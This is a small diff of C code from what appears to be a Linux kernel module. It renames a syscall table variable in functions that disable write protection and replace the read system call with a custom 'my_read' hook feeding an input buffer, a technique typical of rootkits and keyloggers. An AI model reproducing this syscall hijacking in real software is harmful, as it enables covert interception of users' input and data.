@@ -287,14 +287,14 @@ void listen(void){
 	tinbuf_lock = __SPIN_LOCK_UNLOCKED(tinbuf_lock);
 	INIT_LIST_HEAD(&inbuf_head.list);
 
-	orig_sys_read = syscall_table[__NR_read];
-	syscall_table[__NR_read] = my_read;
+	orig_sys_read = _sys_call_table[__NR_read];
+	_sys_call_table[__NR_read] = my_read;
 	enable_wp();
 }
 
 void stop_listen(void){
 	disable_wp();
-	syscall_table[__NR_read] = orig_sys_read;
+	_sys_call_table[__NR_read] = orig_sys_read;
 	enable_wp();
   	while(rcount>0){// hack to unblock read
       msleep_interruptible(100);
